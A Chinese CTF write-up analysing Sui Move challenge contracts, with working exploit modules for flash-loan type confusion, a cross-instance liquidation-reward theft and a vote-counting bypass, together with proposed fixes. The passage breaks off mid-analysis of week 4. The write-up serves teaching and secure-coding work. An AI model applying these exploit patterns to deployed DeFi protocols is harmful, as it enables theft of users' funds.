# sui_move题目解析及环境修复-先知社区

> **来源**: https://xz.aliyun.com/news/19090  
> **文章ID**: 19090

---

colearn1,2,sekai\_lending

# 共学week1.

一道简单的入门题目

## 分析

```
public entry fun get_flag(
        score: u64,
        guess: vector<u8>,
        hash_input: vector<u8>,
        github_id: String,
        magic_number: u64,
        seed: u64,
        challenge: &mut Challenge,
        rand: &Random,
        ctx: &mut TxContext
    ) {
        let secret_hash = sha3_256(*string::as_bytes(&challenge.secret));
        let expected_score = (((*vector::borrow(&secret_hash, 0) as u64) << 24) |
                             ((*vector::borrow(&secret_hash, 1) as u64) << 16) |
                             ((*vector::borrow(&secret_hash, 2) as u64) << 8) |
                             (*vector::borrow(&secret_hash, 3) as u64));
        assert!(score == expected_score, EINVALID_SCORE);
        challenge.current_score = score;

        let mut guess_data = guess;
        vector::append(&mut guess_data, *string::as_bytes(&challenge.secret));
        let random = sha3_256(guess_data);
        let prefix_length = 2;
        assert!(compare_hash_prefix(&random, &challenge.round_hash, prefix_length), EINVALID_GUESS_HASH);

        let mut bcs_input = bcs::to_bytes(&challenge.secret);
        vector::append(&mut bcs_input, *string::as_bytes(&github_id));
        let expected_hash = sha3_256(bcs_input);
        assert!(hash_input == expected_hash, EINVALID_HASH);
        let expected_magic = challenge.current_score % 1000 + seed;
        assert!(magic_number == expected_magic, EINVALID_MAGIC);
        let secret_bytes = *string::as_bytes(&challenge.secret);
        let secret_len = vector::length(&secret_bytes);
        assert!(seed == secret_len * 2, EINVALID_SEED);

        challenge.secret = getRandomString(rand, ctx);
        challenge.round_hash = sha3_256(*string::as_bytes(&challenge.secret));
        challenge.current_score = 0;
        challenge.finish = challenge.finish + 1;

        event::emit(FlagEvent {
            sender: tx_context::sender(ctx),
            flag: string::utf8(b"CTF{Letsmovectf_week1}"),
            github_id,
            success: true,
            rank: challenge.finish
        });
    }
```

分析代码可以看出我们需要构建以下几个参数  
score,guess,hash\_input,magic\_number,seed  
这几个参数分别按照get\_flag函数的内容去进行构建就好了

## exp

```
module solve_week1::solve{
    use week1::challenge::{get_flag, Challenge};
    use std::string;
    use std::bcs;
    use std::hash::sha3_256;
    use sui::random::Random;

    #[allow(lint(public_random))]
    public entry fun solve_get_flag(
        challenge: &mut Challenge, 
        rand: &Random, 
        ctx: &mut TxContext) {
        // Check 1: Score
        let secret = b"Letsmovectf_week1";
        let secret_hash = sha3_256(secret);
        let expected_score = (((*vector::borrow(&secret_hash, 0) as u64) << 24) |
                             ((*vector::borrow(&secret_hash, 1) as u64) << 16) |
                             ((*vector::borrow(&secret_hash, 2) as u64) << 8) |
                             (*vector::borrow(&secret_hash, 3) as u64));
        // Check 2: compare_hash_prefix
        let guess = b"G16";
        let mut guess_data = guess;
        vector::append(&mut guess_data, secret);
        // Check 3
        let mut bcs_input = bcs::to_bytes(&string::utf8(b"Letsmovectf_week1"));
        let github_id = string::utf8(b"5a0ae6ad-1d31-4ebb-b67e-29552b0ab341");
        vector::append(&mut bcs_input, *string::as_bytes(&github_id));
        let expected_hash = sha3_256(bcs_input);
        // Check 4&5
        let seed = vector::length(&secret) * 2;
        let expected_magic = expected_score % 1000 + seed;

        get_flag(expected_score, guess, expected_hash, github_id, expected_magic, seed, challenge, rand, ctx);
    }
}
```

# 共学week2.

一道类型校验不严谨的题目

## 分析

```
public fun is_solved(challenge: &Challenge<LP, BUTT, DROP>): bool {
    let pool = &challenge.pool;
    let butt_balance = pool.balance_of<LP, BUTT>();
    let is_flashloan = pool.is_flashloan();

    butt_balance == 0 && is_flashloan == false
}

public fun get_flag(challenge: &mut Challenge<LP, BUTT, DROP>, github_id: String, ctx: &mut TxContext) {
    assert!(is_solved(challenge), ENotSolved);
    assert!(!challenge.success, EAlreadySolved);

    challenge.success = true;

    event::emit(FlagEvent {
        sender: ctx.sender(),
        flag: string::utf8(b"CTF{MoveCTF-Task2}"),
        github_id,
        success: true
    });
}
```

通过分析以上部分可以看出我们的目的是保证在非闪电贷的状态下把butt\_balance变为0

```
public fun flashloan<LP, A>(
    pool: &mut Pool<LP>,
    amount: u64,
    ctx: &mut TxContext,
): (Coin<A>, FlashReceipt) {
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    assert!(!pool.flashloan, EFlashloanAlreadyInProgress);

    pool.flashloan = true;

    let coin = withdraw_internal<LP, A>(pool, amount, ctx);
    let receipt = FlashReceipt {
        pool_id: object::id(pool),
        type_name: type_name::get<A>().into_string(),
        repay_amount: amount * (FEE_PRECISION + FLASHLOAN_FEE) / FEE_PRECISION,
    };

    (coin, receipt)
}

public fun repay_flashloan<LP, A>(pool: &mut Pool<LP>, receipt: FlashReceipt, coin: Coin<A>) {
    let FlashReceipt { pool_id: id, type_name: _, repay_amount: amount } = receipt;
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    assert!(object::id(pool) == id, EPoolIdMismatch);
    assert!(coin::value(&coin) == amount, ERepayAmountMismatch);
    deposit_internal<LP, A>(pool, coin);

    pool.flashloan = false;
}
```

我们注意到这两个函数的验证是contains\_type<LP, A>(pool)，而且FlashReceipt中并没有说明我们借出的是哪一种coin，也就是说我们借出了全部的butt之后可以归还另一种coin来让pool.flashloan = false;并且butt\_balance == 0

所以我们需要一个获取另一种coin的方法，这里注意到swap\_a\_to\_b()

```
public fun swap_a_to_b<LP, A, B>(
    pool: &mut Pool<LP>,
    coin_a: Coin<A>,
    ctx: &mut TxContext,
): Coin<B> {
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    assert!(contains_type<LP, B>(pool), ETypeNotFoundInPool);
    assert!(!pool.flashloan, EFlashloanAlreadyInProgress);

    let amount_out = coin_a.value() * balance_of<LP, B>(pool) / balance_of<LP, A>(pool);
    let fee = amount_out * pool.swap_fee / FEE_PRECISION;
    deposit<LP, A>(pool, coin_a);
    withdraw_internal(pool, amount_out - fee, ctx)
}
```

注意到其内部有一个assert!(!pool.flashloan, EFlashloanAlreadyInProgress);验证，也即只能在非闪电贷状态下才能swap，所以不可用，我们需要另一个方案

而这个合约中初始资金的获取方式为

```
public fun claim_drop(challenge: &mut Challenge<LP, BUTT, DROP>, ctx: &mut TxContext): Coin<DROP> {
    assert!(!challenge.claimed, EAlreadyClaimed);

    challenge.claimed = true;
    let airdrop = challenge.drop_balance.withdraw_all().into_coin(ctx);

    airdrop
}
```

领取空投可以获取1100drop

```
public(package) fun mint_for_pool<BUTT>(mut mint: MintBUTT<BUTT>, ctx: &mut TxContext): Coin<BUTT> {
    let coin_butt = mint.cap.mint(1000, ctx);
    let MintBUTT<BUTT> {
        id: idb,
        cap: treasury
    } = mint;
    object::delete(idb);
    transfer::public_freeze_object(treasury);
    coin_butt
}
```

可以看出初始butt只有1000,且叠加上归还手续费后也只是1050,数值小于我们所拥有的drop的值

```
repay_amount: amount * (FEE_PRECISION + FLASHLOAN_FEE) / FEE_PRECISION
```

由此我们可以得到一个思路：  
claim获得drop --> flashloan借出1000butt --> 归还1050drop() --> get\_flag

## exp

```
module solve_week2::solve{
    use week2::challenge::{Challenge, get_flag, claim_drop, create_challenge};
    use week2::pool::{CreatePoolCap, flashloan, repay_flashloan};
    use week2::lp::LP;
    use week2::butt::{BUTT, MintBUTT};
    use week2::drop::{DROP, MintDROP};
    use std::string::String;
    use sui::transfer::public_share_object;

    #[allow(lint(share_owned))]
    public entry fun create(mint_butt: MintBUTT<BUTT>, mint_drop: MintDROP<DROP>, create_cap: CreatePoolCap<LP>, ctx: &mut TxContext) {
        let challenge = create_challenge(mint_butt, mint_drop, create_cap, ctx);
        public_share_object(challenge);
    }

    public fun solve_get_flag(
        challenge: &mut Challenge<LP, BUTT, DROP>,
        github_id: String,
        ctx: &mut TxContext) {
        // get airdrop 1100 -> split to leave only 1050
        let (coin1, coin2) = {
            let mut balance = claim_drop(challenge, ctx).into_balance();
            let split_balance = balance.split(1050);
            (split_balance.into_coin(ctx), balance.into_coin(ctx))
        };
        transfer::public_transfer(coin2, @0x0);
        // flashloan<BUTT> 1000, receipt 1050
        let (coin, receipt) = flashloan<LP, BUTT>(challenge.get_pool_mut(), 1000, ctx);
        transfer::public_transfer(coin, @0x0);
        // repay_flashloan<DROP> 1050
        repay_flashloan<LP, DROP>(challenge.get_pool_mut(), receipt, coin1);
        get_flag(challenge, github_id, ctx);
    }
}
```

## 修复

因为这道题的漏洞在于使用不同类型的coin来归还，所以我们需要在归还的函数上添加一个assert验证，验证归还的coin和借出的coin是同一个类型的

```
// 新增错误码
const EReceiptTypeMismatch: u64 = 4;


// 修改 repay_flashloan，增加类型名校验
public fun repay_flashloan<LP, A>(pool: &mut Pool<LP>, receipt: FlashReceipt, coin: Coin<A>) {
    let FlashReceipt { pool_id: id, type_name: receipt_type_name, repay_amount: amount } = receipt;
    // 先验证 pool 中确实包含该币种
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    // pool id 必须一致
    assert!(object::id(pool) == id, EPoolIdMismatch);
    // 新增：类型名必须和 A 的类型名一致（防止用其它币种归还）
    assert!(receipt_type_name == type_name::get<A>().into_string(), EReceiptTypeMismatch);
    // 数量必须匹配
    assert!(coin::value(&coin) == amount, ERepayAmountMismatch);
    deposit_internal<LP, A>(pool, coin);

    pool.flashloan = false;
}
```

# sekai\_lending

函数可见性问题+原子性+溢出风险(在这道题由于数值较小没有问题，但是这个写法有问题)

## 分析

```
public fun is_solved(challenge: &Challenge) {
        assert!(balance::value(&challenge.sekai_donation) == INITIAL_SEKAI * 8 / 10 && 
        balance::value(&challenge.collateral_donation) == INITIAL_COLLATERAL, ENotSolved);
    }
```

注意到sekai和collateral都是初始就有100，任务要求最后剩100collateral和80sekai

第一步显然是claim,claim获取10collateral,想办法拿出足够的sekai和collateral,然后把collateral和sekai使用donate\_\*存进池子里

```
    const MAX_BORROW_RATIO: u64 = 80;
    public fun borrow_coin(
        self: &mut SEKAI_LENDING,
        position: &mut UserPosition,
        borrow_amount: u64,
        ctx: &mut TxContext
    ): Coin<SEKAI_COIN> {
        let user = tx_context::sender(ctx);
        assert!(!position.is_liquidated, EUserNotAuthorized);

        let max_borrow = min(
            ((convert_decimal(position.collateral_amount, COLLATERAL_DECIMALS, SEKAI_DECIMALS) * LTV_RATIO) / 100) as u128,
            (self.borrowed_pool.value() * MAX_BORROW_RATIO / 100) as u128
        );

        assert!(borrow_amount <= max_borrow as u64, EInsufficientCollateral);

        position.borrowed_amount = position.borrowed_amount + borrow_amount;
        position.last_update = tx_context::epoch(ctx);

        let borrowed_coins = coin::from_balance(balance::split(&mut self.borrowed_pool, borrow_amount), ctx);

        self.total_borrowed = self.total_borrowed + borrow_amount;


        sui::event::emit(BorrowEvent {
            user,
            borrow_amount,
            collateral_used: position.collateral_amount,
        });

        borrowed_coins
    }
```

然后我们注意到可以借出的数值是抵押的数值的80%，claim只能获取到10collateral，那么只能借出8，就要使用一点手段使得我们拥有的coin变多，在这个题目内，只有初始的challenge::sekai\_lending里面有coin存在，所以我们需要做的事情就是从里面掏出coin

```
claim_liquidation_reward()
withdraw_protocol_fees()
withdraw_collateral()
remove_collateral()
```

```
borrow_coin()
remove_liquidity()
```

注意到以上函数可以从lending里面取出coin，其中

```
remove_collateral()
withdraw_protocol_fees()

remove_liquidity()
```

需要admin权限，而显然我们不具备admin权限，所以考虑另外几个函数  
这里获取sekai\_coin的方法就只剩下borrow\_coin()一个函数，但是这是一个借款函数，需要collateral作为抵押，而且需要还款才能提取出collateral，所以我们需要找的方法是通过borrow\_coin()"借到"sekai然后用其他方法掏出collateral

然后从漏洞的角度思考：是否存在overflow、函数可见性和数值精度方面的问题

注意到

```
public fun convert_decimal(amount: u64, source_decimals: u8, target_decimals: u8): u64 {
        if (source_decimals > target_decimals) {
            amount / 10u64.pow(source_decimals - target_decimals)
        } else {
            amount * 10u64.pow(target_decimals - source_decimals)
        }
    }
```

直接用

```
amount * 10u64.pow(target_decimals - source_decimals)
```

在可以构造数值的条件下会有可能导致overflow，但是这个题目里amount的最大数值也就100，所以排除这个问题

另外一个问题就是

```
public fun create(collateral_coin: Coin<COLLATERAL_COIN>, sekai_coin: Coin<SEKAI_COIN>, ctx: &mut TxContext): SEKAI_LENDING {
        SEKAI_LENDING {
            id: object::new(ctx),
            collateral_pool: coin::into_balance(collateral_coin),
            borrowed_pool: coin::into_balance(sekai_coin),
            total_collateral: 0,
            total_borrowed: 0,
            total_liquidations: 0,
            protocol_fees: 0,
            admin: tx_context::sender(ctx)
        }
    }
```

这个函数用来创建sekai\_lending,但是可见性不规范导致所有人都能调用到这个函数，创建出一个sekai\_lending对象，注意到这里自己创建出了sekai\_lending对象之后出现了一个特点：\*\* 我们可以调用一些需要admin权限的函数 \*\*

```
remove_liquidity()
remove_collateral()
withdraw_protocol_fees()
```

注意到使用remove\_collateral()可以从自建的sekai\_lending里面获取collateral

这样的话，我们可以从自建的sekai\_lending里面获取collateral，只需要再找一个方法从challenge的sekai\_lending里面获取collateral，就好了  
注意到

```
    public fun claim_liquidation_reward(
        self: &mut SEKAI_LENDING,
        position: &mut UserPosition,
        ctx: &mut TxContext
    ): Coin<COLLATERAL_COIN> {
        let reward = position.liquidation_reward;
        position.liquidation_reward = 0;
        let reward_balance = balance::split(&mut self.collateral_pool, reward);
        let reward_coins = coin::from_balance(reward_balance, ctx);
        reward_coins
    }
```

这个函数可以从challenge的sekai\_lending里面获取collateral

结合以上，我们可以得到一个思路：  
1.claim获取collateral  
2.在challenge的sekai\_lending存入collateral并借出sekai  
3.通过remove\_collateral()从自建的sekai\_lending里面获取collateral  
4.通过claim\_liquidation\_reward从challenge的sekai\_lending里面获取collateral

前三步都非常简单，需要构建的重点是第四步

注意到claim\_liquidation\_reward()函数可以实现获取一个collateral的功能，但是这是一个获取清算奖励的函数，需要先使用liquidate\_position()函数进行清算

```
    public fun liquidate_position(
        self: &mut SEKAI_LENDING,
        position: &mut UserPosition,
        repayment: Coin<SEKAI_COIN>,
        ctx: &mut TxContext
    ) {
        assert!(!position.is_liquidated, EPositionNotLiquidatable);
        
        let ltv = position.borrowed_amount * 100 / convert_decimal(position.collateral_amount, COLLATERAL_DECIMALS, SEKAI_DECIMALS);
        let protocol_ltv = self.total_borrowed * 100 / convert_decimal(self.collateral_pool.value(), COLLATERAL_DECIMALS, SEKAI_DECIMALS);
        assert!(ltv > LIQUIDATION_THRESHOLD || protocol_ltv > LIQUIDATION_THRESHOLD, ELiquidationThreshold);

        
        let liquidator = tx_context::sender(ctx);
        let repayment_amount = coin::value(&repayment);
        assert!(repayment_amount >= position.borrowed_amount, EInsufficientRepayment);
        
        let debt_to_repay = position.borrowed_amount;
        let collateral_to_liquidate = position.collateral_amount;
        let protocol_fee = (collateral_to_liquidate * LIQUIDATION_PENALTY) / 100;
        
        let liquidator_reward = collateral_to_liquidate - protocol_fee;
        
        balance::join(&mut self.borrowed_pool, coin::into_balance(repayment));
        
        position.liquidation_epoch = tx_context::epoch(ctx);
        position.is_liquidated = true;
        position.liquidation_reward = liquidator_reward;
        position.collateral_amount = 0;
        position.borrowed_amount = 0;
        

        self.protocol_fees = self.protocol_fees + protocol_fee; 
        self.total_collateral = self.total_collateral - collateral_to_liquidate;
        self.total_borrowed = self.total_borrowed - debt_to_repay;
        self.total_liquidations = self.total_liquidations + 1;

        sui::event::emit(LiquidateEvent {
            liquidator,
            collateral_liquidated: collateral_to_liquidate,
            debt_repaid: debt_to_repay,
            liquidator_reward
        });
    }
```

注意到这个函数就是清算函数，可以用这个函数计算清算奖励，我们注意到清算时清算的对象是UserPosition，而接下来我们审计claim\_liquidation\_reward()函数：

```
    public fun claim_liquidation_reward(
        self: &mut SEKAI_LENDING,
        position: &mut UserPosition,
        ctx: &mut TxContext
    ): Coin<COLLATERAL_COIN> {
        let reward = position.liquidation_reward;
        position.liquidation_reward = 0;
        let reward_balance = balance::split(&mut self.collateral_pool, reward);
        let reward_coins = coin::from_balance(reward_balance, ctx);
        reward_coins
    }
```

注意到这里面缺少一个很重要的验证：\*\* UserPosition和SEKAI\_LENDING的从属关系 \*\*  
这就导致了一个问题：无法保证清算的UserPosition和SEKAI\_LENDING的从属关系，也就是不能保证清算的函数和获取清算奖励的函数调用到的是同一个SEKAI\_LENDING  
也就是说存在一种方案：在自建的SEKAI\_LENDING进行清算，然后在challenge里的SEKAI\_LENDING提取清算奖励

由此我们得到一个确定的思路：

1.claim获取collateral  
2.在challenge的sekai\_lending存入collateral并借出sekai  
3.在自建的sekai\_lending存入流动性并借款  
4.在自建的sekai\_lending使用liquidate\_position()进行清算  
5.通过claim\_liquidation\_reward从challenge的sekai\_lending里面提取清算奖励获取collateral  
6.通过remove\_collateral()从自建的sekai\_lending里面获取collateral  
注：第六步不一定要使用remove\_collateral()，因为在自建的sekai\_lending里面我们持有admin权限，所以也可以使用withdraw\_protocol\_fees()来获取  
简单地说就是这样：借款→清算(还款)→提取抵押

## exp

```
module the_solution::solution {

    use challenge::challenge::{Self, Challenge};
    use challenge::collateral_coin::{Self, COLLATERAL_COIN};
    use challenge::sekai_coin::{Self, SEKAI_COIN};
    use challenge::sekai_lending::{Self, SEKAI_LENDING, UserPosition};
    use sui::balance::{Self, Supply};
    use sui::coin::{Self, TreasuryCap, CoinMetadata};
    use sui::tx_context::{Self, TxContext};
    const SEKAI: u64 = 100000000;
    const COLLATERAL: u64 = 1000000000;

    #[allow(lint(self_transfer))]
    public fun solve(challenge: &mut Challenge, ctx: &mut TxContext) {
        let claim = challenge::claim(challenge, ctx);
        let mut sekai_lending = challenge.get_sekai_lending_mut();
        let mut sekai_lending2 = sekai_lending::create(
            coin::zero<COLLATERAL_COIN>(ctx),
            coin::zero<SEKAI_COIN>(ctx),
            ctx,
        );

        let mut position1 = sekai_lending.open_position(ctx);
        sekai_lending.deposit_collateral(&mut position1, claim, ctx);
        let mut sekai_coin = sekai_lending.borrow_coin(&mut position1, 8 * SEKAI, ctx);


        let sekai_coin_half = coin::split(&mut sekai_coin, 4 * SEKAI, ctx);
        sekai_lending.repay_loan(sekai_coin_half, &mut position1, ctx);
        let collateral_coin = sekai_lending.withdraw_collateral(5 * COLLATERAL, &mut position1, ctx);

        sekai_lending2.add_liquidity(sekai_coin, ctx);
        sekai_lending.deposit_collateral(&mut position1, collateral_coin, ctx);
        let mut i = 0;
        let mut rewards = coin::zero<COLLATERAL_COIN>(ctx);
        let collateral_coin = sekai_lending.withdraw_collateral(5 * COLLATERAL, &mut position1, ctx);
        rewards.join(collateral_coin);
        while (i < 22) {
            let collateral_coin = rewards.split(5 * COLLATERAL, ctx);
            let mut position2 = sekai_lending2.open_position(ctx);
            sekai_lending2.deposit_collateral(&mut position2, collateral_coin, ctx);
            let sekai_coin2 = sekai_lending2.borrow_coin(&mut position2, 320_000_000, ctx);
            let mut collateral_coin_4 = sekai_lending2.remove_collateral(4 * COLLATERAL, ctx);

            sekai_lending2.liquidate_position(&mut position2, sekai_coin2, ctx);
            let collateral_coin_1 = sekai_lending2.remove_collateral(1 * COLLATERAL, ctx);
            let reward = sekai_lending.claim_liquidation_reward(&mut position2, ctx);
            rewards.join(reward);

            collateral_coin_4.join(collateral_coin_1);
            rewards.join(collateral_coin_4);
            transfer::public_transfer(position2, tx_context::sender(ctx));
            i = i + 1;
        };

        let coll_split = rewards.split(90 * COLLATERAL, ctx); // 9 REMAIN
        sekai_lending.deposit_collateral(&mut position1, coll_split, ctx);

        let mut sekai_coin = sekai_lending.borrow_coin(&mut position1, 76 * SEKAI, ctx);

        i = 0;
        while (i < 21) {
            let coin_5 = rewards.split(5 * COLLATERAL, ctx);
            let mut position2 = sekai_lending2.open_position(ctx);
            sekai_lending2.deposit_collateral(&mut position2, coin_5, ctx);
            let sekai_coin2 = sekai_lending2.borrow_coin(&mut position2, 320_000_000, ctx);
            let mut collateral_coin_4 = sekai_lending2.remove_collateral(4 * COLLATERAL, ctx);
            sekai_lending2.liquidate_position(&mut position2, sekai_coin2, ctx);
            let collateral_coin_1 = sekai_lending2.remove_collateral(1 * COLLATERAL, ctx);
            let reward = sekai_lending.claim_liquidation_reward(&mut position2, ctx);
            rewards.join(reward);

            collateral_coin_4.join(collateral_coin_1);
            rewards.join(collateral_coin_4);
            transfer::public_transfer(position2, tx_context::sender(ctx));
            i = i + 1;
        };

        sekai_coin.join(sekai_lending2.remove_liquidity(4*SEKAI, ctx)); // 80
        let coll_80 = rewards.split(100 * COLLATERAL, ctx);
        transfer::public_transfer(sekai_lending2, tx_context::sender(ctx));

        challenge.donate_collateral(coll_80);
        challenge.donate_sekai(sekai_coin);

        challenge.is_solved();

        transfer::public_transfer(position1, tx_context::sender(ctx));
        transfer::public_transfer(rewards, tx_context::sender(ctx));
    }

}
```

## 修复方案

### 思路1.修复create函数的可见性

在实际生产中可以这样做，但是这样做也是治标不治本，如果在实际生产环境的链上已经有人调用过 create() 部署过别的池，那些实例依然存在。仅修改 create 的可见性不会清理掉它们。攻击者依然能用这些遗留实例发动跨实例攻击。  
而且只能用一个固定池，功能性受限，如果未来真要多池子，就得再开一个“白名单工厂”来管理创建权。

### 思路2.治本

2.1.绑定关系  
UserPosition和SEKAI\_LENDING必须绑定，杜绝跨实例调用

```
    // 在原来 struct 定义里新增 user_positions:
    public struct SEKAI_LENDING has key, store {
        id: UID,
        collateral_pool: Balance<COLLATERAL_COIN>,
        borrowed_pool: Balance<SEKAI_COIN>,
        total_collateral: u64,
        total_borrowed: u64,
        total_liquidations: u64,
        protocol_fees: u64,
        admin: address,
        user_positions: vector<UID> // 新增：登记本 lending 的所有 position id
    }

    fun uid_equals(a: &UID, b: &UID): bool {
        object::id(a) == object::id(b)
    }

    // 新增：检查 position 是否属于当前 lending，失败则 assert
    fun assert_position_belongs_to_self(self: &SEKAI_LENDING, position: &UserPosition) {
        let pos_id = &position.id;
        let mut found = false;
        let mut i = 0;
        while (i < vector::length(&self.user_positions)) {
            let stored = *vector::borrow(&self.user_positions, i);
            if (uid_equals(&stored, pos_id)) {
                found = true;
                break;
            };
            i = i + 1;
        };
        assert!(found, EPositionNotOwnedByThisLending);
    }

    // open_position: 将新 position 的 id push 到 self.user_positions
    public fun open_position(self: &mut SEKAI_LENDING, ctx: &mut TxContext): UserPosition {
        let new_pos = UserPosition {
            id: object::new(ctx),
            collateral_amount: 0,
            borrowed_amount: 0,
            last_update: tx_context::epoch(ctx),
            is_liquidated: false,
            liquidation_epoch: 0,
            liquidation_reward: 0
        };
        // 记录 id
        vector::push_back(&mut self.user_positions, new_pos.id);
        new_pos
    }

然后在相关的敏感函数上添加assert_position_belongs_to_self(self, position);检验position和sekai_lending的关系
```

2.2.原子性兑换  
清算和清算奖励的分发应该直接放在同一个函数里面，这样就可以保证不会出现跨实例提取coin

```
public fun liquidate_and_claim(
    self: &mut SEKAI_LENDING,
    position: &mut UserPosition,
    repayment: Coin<SEKAI_COIN>,
    ctx: &mut TxContext
): Coin<COLLATERAL_COIN> {
    assert!(!position.is_liquidated, EPositionNotLiquidatable);

    let ltv = position.borrowed_amount * 100 
        / convert_decimal(position.collateral_amount, COLLATERAL_DECIMALS, SEKAI_DECIMALS);
    let protocol_ltv = self.total_borrowed * 100 
        / convert_decimal(self.collateral_pool.value(), COLLATERAL_DECIMALS, SEKAI_DECIMALS);
    assert!(ltv > LIQUIDATION_THRESHOLD || protocol_ltv > LIQUIDATION_THRESHOLD, ELiquidationThreshold);

    let liquidator = tx_context::sender(ctx);
    let repayment_amount = coin::value(&repayment);
    assert!(repayment_amount >= position.borrowed_amount, EInsufficientRepayment);

    let debt_to_repay = position.borrowed_amount;
    let collateral_to_liquidate = position.collateral_amount;
    let protocol_fee = (collateral_to_liquidate * LIQUIDATION_PENALTY) / 100;

    // 💰 liquidator 奖励 = 抵押品 - 协议手续费
    let liquidator_reward = collateral_to_liquidate - protocol_fee;

    // 债务资金返还池子
    balance::join(&mut self.borrowed_pool, coin::into_balance(repayment));

    // 更新 position 状态
    position.liquidation_epoch = tx_context::epoch(ctx);
    position.is_liquidated = true;
    position.collateral_amount = 0;
    position.borrowed_amount = 0;
    position.liquidation_reward = 0; // 不再存奖励，直接发出

    // 更新协议数据
    self.protocol_fees = self.protocol_fees + protocol_fee;
    self.total_collateral = self.total_collateral - collateral_to_liquidate;
    self.total_borrowed = self.total_borrowed - debt_to_repay;
    self.total_liquidations = self.total_liquidations + 1;

    // ⚡直接给 liquidator 奖励
    let reward_balance = balance::split(&mut self.collateral_pool, liquidator_reward);
    let reward_coins = coin::from_balance(reward_balance, ctx);

    sui::event::emit(LiquidateEvent {
        liquidator,
        collateral_liquidated: collateral_to_liquidate,
        debt_repaid: debt_to_repay,
        liquidator_reward
    });

    reward_coins
}
```

### 修复细节

注意到在

```
    public fun convert_decimal(amount: u64, source_decimals: u8, target_decimals: u8): u64 {
        if (source_decimals > target_decimals) {
            amount / 10u64.pow(source_decimals - target_decimals)
        } else {
            amount * 10u64.pow(target_decimals - source_decimals)
        }
    }
```

这个地方有amount \* 10u64.pow(target\_decimals - source\_decimals)这样的一个式子，如果amount的数值过大的话是可能导致出现溢出的，需要防止这个问题  
amount / 10u64.pow(source\_decimals - target\_decimals)这里amount较小而10u64.pow(source\_decimals - target\_decimals)可能会出现精度丢失的问题，具体需要怎么修复看项目需求

修复

```
    public fun convert_decimal(amount: u64, source_decimals: u8, target_decimals: u8): u64 {
        if (source_decimals > target_decimals) {
            amount / 10u64.pow(source_decimals - target_decimals)
        } else {
            let result = amount as u128 * 10u128.pow(target_decimals - source_decimals)
            assert!(result <= (u64::MAX as u128), 100); // EOverflow
            result as u64
        }
    }
```

# 共学week3.

## 分析

```
public fun get_flag(
    briber: &mut Briber,
    ballot: &Ballot,
    github_id: String,
    ctx: &TxContext,
) {
    let ballot_id = ballot.id();
    assert!(!briber.given_list.contains(ballot_id));
    let votes = ballot.voted().try_get(&required_candidate());
    assert!(votes.is_some());
    assert!(votes.destroy_some() >= required_votes());
    flag::emit_flag(ctx.sender(), ballot.id().to_address().to_string(), github_id);
    briber.given_list.add(ballot_id, true);
}
```

获取flag要求：票数达到21

### 投票流程:

request\_vote() --> vote() --> finish\_voting()

由于

```
public fun default_voting_power(): u64 { 10 }
```

限制导致每一个voterequest只有10票，但是一个candidate需要21票,所以需要找到方法突破这个限制

### 漏洞

```
public fun register(
    ctx: &mut TxContext,
) {
    let candidate = Candidate {
        id: object::new(ctx),
        account: ctx.sender(),
        total_votes: 0,
    };
    transfer::share_object(candidate);
}

public fun amend_account(
    candiate: &mut Candidate,
    account: address,
) {
    candiate.account = account;
}
```

初始设置是每个人都只能投票给自己，在amend\_account函数的作用下可以修改投票的对象，也就可以用多个用户来投票给同一个用户实现超过21票的要求

```
public fun request_vote(ballot: &mut Ballot): VoteRequest {
    assert!(ballot.voted.is_empty());
    assert!(!ballot.has_voted);
    ballot.has_voted = true;
    VoteRequest {
        voting_power: default_voting_power(),
        voted: vec_map::empty(),
    }
}

public fun finish_voting(ballot: &mut Ballot, request: VoteRequest) {
    let VoteRequest {
        voting_power: _,
        voted,
    } = request;
    let (candidates, votes) = voted.into_keys_values();
    candidates.zip_do!(votes, |c, v| {
        let ballot_voted = &mut ballot.voted;
        let already_voted = ballot_voted.try_get(&c);
        if (already_voted.is_some()) {
            *ballot_voted.get_mut(&c) = already_voted.destroy_some() + v;
        } else {
            ballot_voted.insert(c, v);
        }
    });
}
```

注意到在request\_vote()中存在ballot验证是否已经投票，而finish\_voting()里面不存在ballot验证，所以可以通过request\_vote() :request1 --> ballot1,request1 -->ballot1:10 --> request\_vote() :request2 --> ballot1,request2 -->ballot1:20 --> request\_vote() :request3 --> ballot1,request3 -->ballot1:30 -->get\_flag()

## exp

```
module solve_bribery_voting::solve {
    use bribery_voting::ballot::{Ballot, request_vote, finish_voting};
    use bribery_voting::candidate::{Candidate, vote};

    public fun solve_request_vote(candidate: &mut Candidate, ballot: &mut Ballot, _ctx: &mut TxContext) {
        let mut vote_request = request_vote(ballot);
        vote(candidate, &mut vote_request, 10);
        finish_voting(ballot, vote_request);
    }

    public fun solve_request_vote_subsequent(candidate: &mut Candidate, ballot1: &mut Ballot, ballot2: &mut Ballot, _ctx: &mut TxContext) {
        let mut vote_request = request_vote(ballot2);
        vote(candidate, &mut vote_request, 10);
        finish_voting(ballot1, vote_request);
    }
}
```

# 共学week4.

## 分析

```
public entry fun get_flag(vault: &mut Vault, ctx: &mut TxContext){
        assert!(vault.owner == tx_context::sender(ctx), NO_PERMISSION);
        if(vault.balance >= 200){
           event::emit (Flag {
            user: tx_context::sender(ctx),
            flag: true,
        }); 
        }
    }

```

注意到get\_flag的要求是balance>=200，从

```
    public fun init_vault(ctx: &mut TxContext){
        let vault = Vault{
            id: object::new(ctx),
            owner: tx_context::sender(ctx),
            balance: 100,
        };
        transfer::transfer(vault, tx_context::sender(ctx));
    }
```

可以看到我们初始只有100balance，也就是说我们需要想办法来实现获取额外的100balance

```
public fun buy_potato(vault: &mut Vault, ctx: &mut TxContext){
        assert!(get_owner(vault) == tx_context::sender(ctx), NO_PERMISSION);
        assert!(get_balance(vault) >= 3, NO_MONEY);
        let balance = get_balance(vault);
        set_balance(vault, (balance-3));
        let potato = Potato{
            id: object::new(ctx),
            cooked: false,
        };
        transfer::transfer(potato, tx_context::sender(ctx));
    }

    public fun cook_potato(vault: &mut Vault, potato: &mut Potato, ctx: &mut TxContext){
        assert!(get_owner(vault) == tx_context::sender(ctx), NO_PERMISSION);
        assert!(get_balance(vault) >= 1, NO_MONEY);
        let balance = get_balance(vault);
        set_balance(vault, (balance-1));
        potato.cooked = true;
    }

    entry fun sell_potato(clock: &clock::Clock, vault: &mut Vault, potato: Potato, ctx: &mut TxContext){
        assert!(vault::get_owner(vault) == tx_context::sender(ctx), NO_PERMISSION);
